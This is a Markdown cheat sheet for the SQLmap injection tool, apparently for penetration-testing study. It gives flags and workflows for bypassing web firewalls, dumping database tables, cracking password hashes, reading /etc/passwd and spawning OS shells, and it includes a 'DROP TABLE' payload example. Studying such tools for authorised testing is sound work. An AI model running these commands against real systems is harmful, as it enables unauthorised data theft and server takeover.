# 🛠️ Tool Master Guide: SQLmap (Automated SQL Injection Engine)

> [!INFO] 📋 **Root Metadata**
> - **Tool Name**: SQLmap
> - **Category**: Automated SQL Injection & Database Takeover Engine (#1 Choice)
> - **License**: Open Source (GPL-2.0)
> - **Installation Command**: `sudo apt update && sudo apt install -y sqlmap`
> - **Binary Path**: `/usr/bin/sqlmap`
> - **Tamper Scripts Directory**: `/usr/share/sqlmap/tamper/`
> - **Output Directory**: `~/.local/share/sqlmap/output/` or `~/.sqlmap/output/`
> - **Primary Objective**: Detects and exploits SQL injection vulnerabilities in web application parameters, enumerates remote database schemas, extracts data tables, cracks password hashes, and spawns interactive OS system shells.

---

## ⚡ 1. Technical Mechanics & Architectural Engine

```
                              ┌──────────────────────────────────┐
                              │  Burp Request / Target URL (-r)  │
                              └────────────────┬─────────────────┘
                                               │
                                               ▼
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                                 SQLmap Injection Engine                                │
│  ┌──────────────────────┐   ┌─────────────────────────┐   ┌─────────────────────────┐  │
│  │ WAF Tamper Obfuscator│──►│ Payload Injector        │──►│ Response Evaluator      │  │
│  │ (--tamper=space2...) │   │ (Boolean/Error/Time/...)│   │ (True/False/Sleep/Error)│  │
│  └──────────────────────┘   └─────────────────────────┘   └─────────────────────────┘  │
└──────────────────────────────────────────────┬─────────────────────────────────────────┘
                                               │
                                               ▼
                              ┌──────────────────────────────────┐
                              │ Data Dump / Shell / File Access  │
                              └──────────────────────────────────┘
```

---

## 📋 2. Injection Techniques Matrix (`--technique`)

| Technique Code | Full Name | Operational Mechanism |
| :--- | :--- | :--- |
| `B` | **Boolean-based Blind** | Evaluates true/false HTTP response variations to extract data bit-by-bit |
| `E` | **Error-based** | Forces database engine to return verbose error messages containing query results |
| `U` | **UNION Query-based** | Appends `UNION ALL SELECT` to append arbitrary database data directly into page output |
| `S` | **Stacked Queries** | Executes multiple SQL statements separated by semicolons (e.g. `; DROP TABLE users;`) |
| `T` | **Time-based Blind** | Measures delay in server response time using sleep functions (e.g. `pg_sleep(5)`) |
| `Q` | **Inline Queries** | Encloses subqueries within main query structure |

---

## 📋 3. Exhaustive Flag & Parameter Reference Matrix

| Flag Category | Flag / Parameter | Description & Technical Function | Syntax Example |
| :--- | :--- | :--- | :--- |
| **Target Spec** | `-u <url>` | Specifies target URL | `sqlmap -u "http://10.10.10.50/item.php?id=1"` |
| | `-r <request.txt>`| Parses raw HTTP request captured from Burp Suite | `sqlmap -r request.txt -p id` |
| **Detection** | `--level <1-5>` | Sets depth of test vectors (Level 5 checks HTTP Headers, Cookies, Referer) | `sqlmap -r req.txt --level 5 --risk 3` |
| | `--risk <1-3>` | Sets risk of tests (Risk 3 includes OR-based heavy tests) | `sqlmap -u URL --risk 3` |
| **Tampering** | `--tamper <name>`| Applies obfuscation scripts to bypass WAF/IDS (e.g. `space2comment`, `randomcase`) | `sqlmap -u URL --tamper=space2comment` |
| **Enumeration**| `--dbs` | Lists all database names on DBMS | `sqlmap -u URL --dbs` |
| | `-D <db> --tables` | Lists all tables inside specified database | `sqlmap -u URL -D target_db --tables` |
| | `-T <tbl> --dump` | Dumps all column records from specified table | `sqlmap -u URL -D target_db -T users --dump` |
| | `--passwords` | Extracts and attempts to crack DBMS user password hashes | `sqlmap -u URL --passwords` |
| **OS Access** | `--os-shell` | Attempts OS command execution shell (e.g. via `xp_cmdshell` or UDF injection) | `sqlmap -r req.txt --os-shell` |
| | `--file-read <path>`| Reads remote host system file | `sqlmap -r req.txt --file-read=/etc/passwd` |

---

## 💻 4. Operational Command Workflows

### Scenario A: Deep WAF Bypass & Database Enumeration
```bash
# 1. Parse Burp Request File & Perform Deep WAF Bypass Database Audit
sqlmap -r burp_sqli_req.txt -p item_id --level 5 --risk 3 --tamper=space2comment,between,randomcase --dbs -o

# 2. Dump Target Database Table Records and Crack Hashes
sqlmap -r burp_sqli_req.txt -D app_db -T admin_users --dump --batch
```

### Scenario B: Interactive OS Shell Takeover
```bash
# Spawn Interactive Operating System Command Shell via SQL Injection
sqlmap -r burp_sqli_req.txt -p item_id --os-shell
```
